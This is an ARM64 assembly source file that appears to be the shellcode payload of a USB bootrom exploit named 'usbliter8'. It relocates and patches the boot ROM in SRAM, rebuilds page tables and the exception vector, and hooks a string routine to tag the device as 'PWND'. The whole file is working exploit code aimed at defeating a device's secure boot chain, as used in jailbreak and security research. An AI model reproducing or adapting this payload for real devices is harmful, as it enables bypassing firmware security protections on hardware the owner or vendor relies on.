/*
    0x19C030000 (+0x358000) - LOAD AREA
    0x19C388000 (+0x4000)   - TTBR          // XXX shall overlap with LOAD AREA?
    0x19C38C000 (+0x4000)   - ROM PTEs
    0x19C390000 (+0x30000)  - ROM
 */

#include "offsets.h"

.text

.globl start
start:
    msr DAIFSet, #3

    ldr x0, =NEW_SP
    mov sp, x0

    ldr x0, =ROM_NEW_PA
    ldr x1, =ROM_BASE
    ldr x2, =ROM_SIZE

    ldr x8, =MEMCPY
    blr x8

    bl  _rom_patchup

    adr x0, start
    ldr x1, =section$start$__TEXT$__tramp
    ldr x2, =section$end$__TEXT$__tramp
    sub x2, x2, x1
    add x1, x1, x0
    ldr x0, =(ROM_NEW_PA + ROM_SIZE + TRAMP_OFF)
    mov x19, x0

    ldr x8, =MEMCPY
    blr x8

    // I hate this assembler
    // adr xN, text_addr - yay!
    // adr xN, data_addr - nay!
    adrp x1, handler_len@page
    add  x1, x1, handler_len@pageoff
    ldr w2, [x1]        // size of our custom handler
    add x1, x1, #0x10   // this will be the actual handler text
    ldr x0, =(ROM_NEW_PA + ROM_SIZE + HANDLER_OFF)

    ldr x8, =MEMCPY
    blr x8

    mrs x0, sctlr_el1
    and x0, x0, #~0x1
    msr sctlr_el1, x0

    dsb sy
    isb

    adr x0, start
    add x0, x0, #0x800
    ldr x1, =BOOT_TRAMP
    ldr x2, =BOOT_TRAMP_LEN
    mov x20, x0

    ldr x8, =MEMCPY
    blr x8

    ic iallu
    dsb sy
    isb

    mrs x0, sctlr_el1
    orr x0, x0, 0x1
    msr sctlr_el1, x0

    dsb sy
    isb

    mov x0, x19
    br  x20

.section __TEXT, __tramp
.globl _tramp
_tramp:
    adr x0, _tramp
    ldr x1, rom_pa
    sub x0, x0, x1
    mov x1, ROM_BASE
    add x0, x0, x1
    msr vbar_el1, x0

    ldr x0, =NEW_SP
    mov sp, x0

    bl  _tt_make

    ldr x0, mair_val
    msr mair_el1, x0

    ldr x0, tcr_val
    msr tcr_el1, x0

    ldr x0, ttbr_val
    msr ttbr0_el1, x0
    isb

    dsb sy
    tlbi vmalle1
    dsb sy
    isb

    ldr x0, sctlr_val
    msr sctlr_el1, x0

    dsb sy
    isb

    mov x8, ROM_BASE
    br  x8

.balign 8
ttbr_val:
    .8byte TTBR_BASE

mair_val:
    .8byte 0x0000FF04

tcr_val:
    .8byte 0x1659CA51C

sctlr_val:
    .8byte 0x48D520D

rom_pa:
    .8byte ROM_NEW_PA

.globl _restore_rom_table
_restore_rom_table:
    ldr x0, rom_pte_base
    orr x0, x0, #3

    ldr x1, ttbr_base
    str x0, [x1, (ROM_BASE / L1_PAGE_SIZE * 8)]

    ret

.balign 8
rom_pte_base:
    .8byte ROM_PTE_BASE

ttbr_base:
    .8byte SRAM_BASE

.globl _add_pwnd_hook
_add_pwnd_hook:
    stp x19, x20, [sp, #-0x10]!
    stp x29, x30, [sp, #-0x10]!
    mov x29, sp

    mov x19, x0

    ldr x8, strlcpy_addr
    blr x8

    mov x0, x19
    adr x1, pwnd_str
    mov w2, #127
    mov w3, #127
    ldr x8, strlcpy_addr
    blr x8

    ldp x29, x30, [sp], #0x10
    ldp x19, x20, [sp], #0x10
    ret

.balign 8
strlcpy_addr:
    .8byte STRLCPY

pwnd_str:
    .asciz " PWND:[usbliter8]"

.balign 4
return_to_rom_va:
    mrs x0, elr_el1
    ldr x1, rom_pa
    sub x0, x0, x1
    mov x1, ROM_BASE
    add x0, x0, x1
    msr elr_el1, x0
    eret

.org 0x200
vbar_vect:
    b   return_to_rom_va

.data
handler_len:
    .4byte 0xDEADDEAD   // populated dynamically by the exploit

.balign 16
handler_start:
